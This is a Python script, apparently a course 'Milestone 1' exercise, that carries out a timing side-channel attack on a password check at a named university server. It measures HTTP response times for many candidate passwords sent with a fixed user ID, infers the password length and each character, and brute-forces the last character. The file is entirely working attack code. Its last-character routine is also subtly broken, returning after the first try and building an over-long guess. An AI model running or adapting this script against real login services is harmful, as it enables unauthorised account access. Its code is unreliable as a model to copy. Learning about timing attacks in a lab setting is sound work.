import time
import requests
import operator
import sys
from tqdm import tqdm
from numpy import mean, median

sys.stderr = sys.stdout  # So tqdm will write to stdout


# ███╗   ███╗██╗██╗     ███████╗███████╗████████╗ ██████╗ ███╗   ██╗███████╗     ██╗
# ████╗ ████║██║██║     ██╔════╝██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝    ███║
# ██╔████╔██║██║██║     █████╗  ███████╗   ██║   ██║   ██║██╔██╗ ██║█████╗      ╚██║
# ██║╚██╔╝██║██║██║     ██╔══╝  ╚════██║   ██║   ██║   ██║██║╚██╗██║██╔══╝       ██║
# ██║ ╚═╝ ██║██║███████╗███████╗███████║   ██║   ╚██████╔╝██║ ╚████║███████╗     ██║
# ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═╝


# ==================================== configuration =====================================

URL = 'http://aoi.ise.bgu.ac.il/?user={}&password={}'
POSSIBLE_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
ID = '205644941'
NUM_ROUNDS_PASSWD_LENGTH = 3
NUM_ROUNDS_PASSWD_GUESSING = 10
MAX_PASSWD_LENGTH = 32
TIMEOUT = 1000

# ========================================================================================


def timing_attack():
    print('Sending wakeup requests...')
    wakeup_server()
    print('Getting password length...')
    passwd_length = get_passwd_length()
    print('Password length is', passwd_length)
    curr_passwd = '*' * passwd_length
    for i in range(passwd_length-1): # -1 beacuse we brute-force last character
        print('----------------------------------')
        print('Current password:', curr_passwd)
        print(f'Guessing character at index {i}')
        next_char = infer_ith_char(i, curr_passwd)
        print(f'Best guess for character at index {i}:', next_char)
        curr_passwd = curr_passwd[:i] + next_char + curr_passwd[i+1:]
    print('Brute-forcing last character...')
    last_char = brute_force_last(curr_passwd)
    curr_passwd = curr_passwd[:-1] + last_char
    print('Current password:', curr_passwd)
    done = is_done(curr_passwd)
    print(done)


def is_done(passwd):
    res = requests.get(URL.format(ID, passwd), timeout=TIMEOUT)
    if res.text == '0':
        return 'Wrong password'
    if res.text == '1':
        return 'Great Success!'


def get_passwd_length():
    length2time = {}
    for length in tqdm(range(1, MAX_PASSWD_LENGTH + 1)):
        passwd = 'a' * length
        rtt = get_rtt(passwd, NUM_ROUNDS_PASSWD_LENGTH)
        length2time[length] = rtt

    passwd_length = max(length2time.items(), key=operator.itemgetter(1))[0]

    return passwd_length

def brute_force_last(passwd):
    for next_char in tqdm(POSSIBLE_CHARS):
        _, res = send_request(passwd + next_char)
        if res == '1':
            return next_char
        return '*' # Unknown

def get_rtt(passwd, num_rounds):
    rtts = []
    for _ in range(num_rounds):
        rtt, _ = send_request(passwd)
        rtts.append(rtt)
    return mean(rtts)


def send_request(passwd):
    start = time.time()
    res = requests.get(URL.format(ID, passwd), timeout=TIMEOUT)
    end = time.time()
    elapsed = end - start
    return elapsed, res.text


def infer_ith_char(i, passwd):
    char2rtt = {}
    for next_char in tqdm(POSSIBLE_CHARS):
        passwd = passwd[:i] + next_char + passwd[i+1:]
        rtt = get_rtt(passwd, NUM_ROUNDS_PASSWD_GUESSING)
        char2rtt[next_char] = rtt

    best_guess = max(char2rtt.items(), key=operator.itemgetter(1))[0]  # Take max
    return best_guess


def wakeup_server():
    for _ in range(16):
        _, _ = send_request('42')


if __name__ == '__main__':
    timing_attack()
